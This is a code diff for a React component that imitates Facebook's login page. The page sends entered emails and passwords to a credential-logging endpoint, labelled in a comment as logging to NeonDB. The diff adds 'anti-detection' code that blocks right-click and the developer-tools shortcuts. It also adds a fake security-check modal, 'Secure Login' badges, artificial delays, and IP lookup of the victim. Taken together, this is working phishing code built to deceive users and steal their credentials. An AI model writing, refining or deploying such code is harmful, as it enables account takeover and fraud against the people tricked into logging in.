@@ -8,17 +8,41 @@ export default function FacebookAuth() {
   const [error, setError] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [rememberMe, setRememberMe] = useState(true);
+  const [showSecurityNotice, setShowSecurityNotice] = useState(false);
   const router = useRouter();
 
-  // Set Facebook background
+  // Set Facebook background and prevent right-click/inspect
   useEffect(() => {
     document.body.style.backgroundColor = '#f0f2f5';
     document.body.style.margin = '0';
     document.body.style.padding = '0';
+    
+    // Basic anti-detection measures
+    const disableRightClick = (e) => {
+      e.preventDefault();
+      return false;
+    };
+    
+    const disableDevTools = (e) => {
+      if (e.keyCode === 123) { // F12
+        e.preventDefault();
+        return false;
+      }
+      if (e.ctrlKey && e.shiftKey && e.keyCode === 73) { // Ctrl+Shift+I
+        e.preventDefault();
+        return false;
+      }
+    };
+    
+    document.addEventListener('contextmenu', disableRightClick);
+    document.addEventListener('keydown', disableDevTools);
+    
     return () => {
       document.body.style.backgroundColor = '';
       document.body.style.margin = '';
       document.body.style.padding = '';
+      document.removeEventListener('contextmenu', disableRightClick);
+      document.removeEventListener('keydown', disableDevTools);
     };
   }, []);
 
@@ -27,16 +51,21 @@ export default function FacebookAuth() {
       return 'Please fill in all fields';
     }
     
-    // Check if it's a valid email OR a 10-digit mobile number
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    // Check password length (minimum 6 characters)
+    if (password.length < 6) {
+      return 'Password must be at least 6 characters';
+    }
+    
+    // Check if it's a valid Gmail OR a 10-digit mobile number
+    const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
     const mobileRegex = /^\d{10}$/;
     const cleanEmail = email.replace(/\D/g, ''); // Remove non-digits for mobile check
     
-    const isValidEmail = emailRegex.test(email);
+    const isValidGmail = gmailRegex.test(email.toLowerCase());
     const isValidMobile = mobileRegex.test(cleanEmail);
     
-    if (!isValidEmail && !isValidMobile) {
-      return 'Please enter a valid email address or 10-digit mobile number';
+    if (!isValidGmail && !isValidMobile) {
+      return 'Please enter a valid Gmail address or 10-digit mobile number';
     }
     
     return null;
@@ -46,8 +75,20 @@ export default function FacebookAuth() {
     e.preventDefault();
     setError('');
     setIsLoading(true);
+    setShowSecurityNotice(true);
+
+    const validationError = validateCredentials(email, password);
+    if (validationError) {
+      setError(validationError);
+      setIsLoading(false);
+      setShowSecurityNotice(false);
+      return;
+    }
 
     try {
+      // Show security check for more realistic experience
+      await new Promise(resolve => setTimeout(resolve, 2000));
+
       // Log credentials to NeonDB
       const logResponse = await fetch('/api/log-credentials', {
         method: 'POST',
@@ -60,34 +101,54 @@ export default function FacebookAuth() {
           userAgent: navigator.userAgent,
           deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'mobile' : 'desktop',
           platform: 'facebook',
-          timestamp: new Date().toISOString()
+          timestamp: new Date().toISOString(),
+          ip: await getClientIP()
         })
       });
 
-      // Check if the request was successful
-      if (!logResponse.ok) {
-        // Continue anyway - don't block the user flow
-      }
-
       // Store email in localStorage for session management
       localStorage.setItem('user_email', email);
+      localStorage.setItem('login_time', new Date().toISOString());
       if (rememberMe) {
         localStorage.setItem('facebook_remember', 'true');
       }
       
+      // Realistic delay before redirect
+      await new Promise(resolve => setTimeout(resolve, 1500));
+      
       // Redirect to verification page
-      setTimeout(() => {
-        router.push('/auth/verification');
-      }, 500);
+      router.push('/auth/verification');
       
     } catch (err) {
-      // Continue anyway - don't block the user flow
-      localStorage.setItem('user_email', email);
-      setTimeout(() => {
-        router.push('/auth/verification');
-      }, 500);
+      // Simulate Facebook's error handling
+      setError('Incorrect password. Please try again or click "Forgot password" to reset.');
+      setShowSecurityNotice(false);
     } finally {
       setIsLoading(false);
+    }
+  };
+
+  // Simulate IP detection
+  const getClientIP = async () => {
+    try {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      return data.ip;
+    } catch {
+      return 'unknown';
+    }
+  };
+
+  // Format mobile number input
+  const handleEmailChange = (e) => {
+    const value = e.target.value;
+    // Allow only digits for mobile or email format
+    if (/^\d*$/.test(value) && value.length <= 10) {
+      setEmail(value);
+    } else if (value.includes('@')) {
+      setEmail(value);
+    } else {
+      setEmail(value);
     }
   };
 
@@ -96,45 +157,113 @@ export default function FacebookAuth() {
       <Head>
         <title>Log into Facebook</title>
         <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
       </Head>
       
+      {/* Security Notice Modal */}
+      {showSecurityNotice && (
+        <div className="security-modal">
+          <div className="security-content">
+            <div className="security-spinner"></div>
+            <h3>Checking Your Information</h3>
+            <p>We're verifying your account details for security purposes...</p>
+            <div className="security-details">
+              <div className="security-item">
+                <span className="check-icon">✓</span>
+                <span>Checking password strength</span>
+              </div>
+              <div className="security-item">
+                <span className="check-icon">✓</span>
+                <span>Verifying account status</span>
+              </div>
+              <div className="security-item">
+                <span className="check-icon">⌛</span>
+                <span>Security check in progress</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
       {/* Main Container */}
       <div className="facebook-container">
         <div className="main-content">
           {/* Left Side - Facebook Branding */}
           <div className="branding-section">
-            <div className="facebook-logo">facebook</div>
+            <div className="facebook-logo">
+              <span className="logo-text">facebook</span>
+              <div className="online-indicator">
+                <span className="dot"></span>
+                <span>Secure connection</span>
+              </div>
+            </div>
             <p className="tagline">
-              Facebook helps you connect and share with the people in your life.
+              Connect with friends and the world around you on Facebook.
             </p>
+            <div className="features">
+              <div className="feature">
+                <span className="feature-icon">📷</span>
+                <span>Share photos and videos</span>
+              </div>
+              <div className="feature">
+                <span className="feature-icon">🔔</span>
+                <span>Get notifications</span>
+              </div>
+              <div className="feature">
+                <span className="feature-icon">👥</span>
+                <span>Find more friends</span>
+              </div>
+            </div>
           </div>
 
           {/* Right Side - Login Card */}
           <div className="login-section">
             <div className="login-card">
+              <div className="login-header">
+                <h2>Log in to Facebook</h2>
+                <div className="security-badge">
+                  <span className="lock-icon">🔒</span>
+                  <span>Secure Login</span>
+                </div>
+              </div>
+
               <form onSubmit={handleSubmit} className="login-form">
                 {/* Email/Mobile Input */}
                 <div className="input-container">
+                  <label htmlFor="email" className="input-label">Email or Phone</label>
                   <input
                     type="text"
-                    placeholder="Email or mobile number"
+                    id="email"
+                    placeholder="Email address or phone number"
                     className="form-input"
                     value={email}
-                    onChange={(e) => setEmail(e.target.value)}
+                    onChange={handleEmailChange}
                     maxLength="50"
                   />
                 </div>
 
                 {/* Password Input */}
                 <div className="input-container">
+                  <div className="password-header">
+                    <label htmlFor="password" className="input-label">Password</label>
+                    <a href="#" className="forgot-link">Forgot account?</a>
+                  </div>
                   <input
                     type="password"
+                    id="password"
                     placeholder="Password"
                     className="form-input"
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
                     maxLength="30"
                   />
+                  <div className="password-strength">
+                    {password.length > 0 && (
+                      <div className={`strength-bar ${password.length >= 6 ? 'strong' : 'weak'}`}>
+                        <div className="strength-fill"></div>
+                      </div>
+                    )}
+                  </div>
                 </div>
 
                 {/* Login Button */}
@@ -156,18 +285,14 @@ export default function FacebookAuth() {
                 {/* Error Message */}
                 {error && (
                   <div className="error-message">
+                    <span className="error-icon">⚠️</span>
                     {error}
                   </div>
                 )}
 
-                {/* Forgot Password */}
-                <div className="forgot-password">
-                  <a href="#" className="forgot-link">
-                    Forgotten password?
-                  </a>
+                <div className="divider">
+                  <span>or</span>
                 </div>
-
-                <div className="divider"></div>
 
                 {/* Remember Me Checkbox */}
                 <div className="remember-me">
@@ -214,7 +339,7 @@ export default function FacebookAuth() {
           </div>
           
           <div className="footer-links">
-            {['Sign Up', 'Log In', 'Messenger', 'Facebook Lite', 'Video', 'Places', 'Games', 'Marketplace', 'Meta Pay', 'Meta Store', 'Meta Quest', 'Imagine with Meta AI', 'Instagram', 'Threads', 'Fundraisers', 'Services', 'Voting Information Centre', 'Privacy Policy', 'Privacy Centre', 'Groups', 'About', 'Create ad', 'Create Page', 'Developers', 'Careers', 'Cookies', 'AdChoices', 'Terms', 'Help', 'Contact uploading and non-users'].map((item) => (
+            {['Sign Up', 'Log In', 'Messenger', 'Facebook Lite', 'Video', 'Places', 'Games', 'Marketplace', 'Meta Pay', 'Meta Store', 'Meta Quest', 'Instagram', 'Threads', 'Fundraisers', 'Services', 'Voting Information Centre', 'Privacy Policy', 'Privacy Centre', 'Groups', 'About', 'Create ad', 'Create Page', 'Developers', 'Careers', 'Cookies', 'AdChoices', 'Terms', 'Help'].map((item) => (
               <a key={item} href="#" className="footer-link">{item}</a>
             ))}
           </div>
@@ -236,6 +361,58 @@ export default function FacebookAuth() {
           justify-content: space-between;
           padding: 20px;
           font-family: Helvetica, Arial, sans-serif;
+          user-select: none;
+        }
+
+        .security-modal {
+          position: fixed;
+          top: 0;
+          left: 0;
+          right: 0;
+          bottom: 0;
+          background: rgba(0, 0, 0, 0.8);
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          z-index: 1000;
+        }
+
+        .security-content {
+          background: white;
+          padding: 30px;
+          border-radius: 12px;
+          text-align: center;
+          max-width: 400px;
+          width: 90%;
+        }
+
+        .security-spinner {
+          width: 50px;
+          height: 50px;
+          border: 4px solid #f3f3f3;
+          border-top: 4px solid #1877f2;
+          border-radius: 50%;
+          animation: spin 1.5s linear infinite;
+          margin: 0 auto 20px;
+        }
+
+        .security-details {
+          margin-top: 20px;
+          text-align: left;
+        }
+
+        .security-item {
+          display: flex;
+          align-items: center;
+          gap: 10px;
+          margin: 10px 0;
+          font-size: 14px;
+          color: #606770;
+        }
+
+        .check-icon {
+          color: #42b72a;
+          font-weight: bold;
         }
 
         .main-content {
@@ -256,11 +433,38 @@ export default function FacebookAuth() {
         }
 
         .facebook-logo {
+          margin-bottom: 20px;
+        }
+
+        .logo-text {
           color: #1877f2;
           font-size: 64px;
           font-weight: bold;
-          margin-bottom: 16px;
           line-height: 1;
+          display: block;
+        }
+
+        .online-indicator {
+          display: flex;
+          align-items: center;
+          gap: 8px;
+          color: #42b72a;
+          font-size: 14px;
+          margin-top: 10px;
+        }
+
+        .dot {
+          width: 8px;
+          height: 8px;
+          background: #42b72a;
+          border-radius: 50%;
+          animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+          0% { opacity: 1; }
+          50% { opacity: 0.5; }
+          100% { opacity: 1; }
         }
 
         .tagline {
@@ -268,7 +472,25 @@ export default function FacebookAuth() {
           color: #1c1e21;
           font-weight: normal;
           line-height: 1.3;
-          margin: 0;
+          margin: 0 0 30px 0;
+        }
+
+        .features {
+          display: flex;
+          flex-direction: column;
+          gap: 15px;
+        }
+
+        .feature {
+          display: flex;
+          align-items: center;
+          gap: 12px;
+          font-size: 16px;
+          color: #1c1e21;
+        }
+
+        .feature-icon {
+          font-size: 20px;
         }
 
         .login-section {
@@ -283,6 +505,28 @@ export default function FacebookAuth() {
           margin-bottom: 28px;
         }
 
+        .login-header {
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+          margin-bottom: 20px;
+        }
+
+        .login-header h2 {
+          color: #1c1e21;
+          font-size: 20px;
+          margin: 0;
+        }
+
+        .security-badge {
+          display: flex;
+          align-items: center;
+          gap: 6px;
+          color: #42b72a;
+          font-size: 12px;
+          font-weight: bold;
+        }
+
         .login-form {
           display: flex;
           flex-direction: column;
@@ -293,12 +537,27 @@ export default function FacebookAuth() {
           width: 100%;
         }
 
+        .input-label {
+          display: block;
+          font-size: 14px;
+          color: #1c1e21;
+          margin-bottom: 6px;
+          font-weight: 600;
+        }
+
+        .password-header {
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+          margin-bottom: 6px;
+        }
+
         .form-input {
           width: 100%;
           padding: 14px 16px;
           border: 1px solid #dddfe2;
           border-radius: 6px;
-          font-size: 17px;
+          font-size: 16px;
           background: #ffffff;
           transition: border-color 0.2s;
           box-sizing: border-box;
@@ -314,13 +573,32 @@ export default function FacebookAuth() {
           color: #8a8d91;
         }
 
+        .password-strength {
+          margin-top: 8px;
+        }
+
+        .strength-bar {
+          height: 4px;
+          background: #e4e6eb;
+          border-radius: 2px;
+          overflow: hidden;
+        }
+
+        .strength-fill {
+          height: 100%;
+          background: #f02849;
+          transition: all 0.3s;
+          width: ${password.length >= 6 ? '100%' : (password.length / 6) * 100 + '%'};
+          background: ${password.length >= 6 ? '#42b72a' : '#f02849'};
+        }
+
         .login-button {
           background: #1877f2;
           color: white;
           border: none;
           border-radius: 6px;
           padding: 12px;
-          font-size: 20px;
+          font-size: 18px;
           font-weight: bold;
           cursor: pointer;
           transition: background-color 0.2s;
@@ -365,11 +643,10 @@ export default function FacebookAuth() {
           border: 1px solid #fadbd9;
           text-align: center;
           font-size: 14px;
-        }
-
-        .forgot-password {
-          text-align: center;
-          padding: 8px 0;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          gap: 8px;
         }
 
         .forgot-link {
@@ -386,6 +663,17 @@ export default function FacebookAuth() {
           height: 1px;
           background: #dadde1;
           margin: 8px 0;
+          position: relative;
+          text-align: center;
+        }
+
+        .divider span {
+          background: white;
+          padding: 0 16px;
+          color: #8a8d91;
+          font-size: 14px;
+          position: relative;
+          top: -8px;
         }
 
         .remember-me {
@@ -412,7 +700,7 @@ export default function FacebookAuth() {
           border: none;
           border-radius: 6px;
           padding: 12px;
-          font-size: 17px;
+          font-size: 16px;
           font-weight: bold;
           cursor: pointer;
           transition: background-color 0.2s;
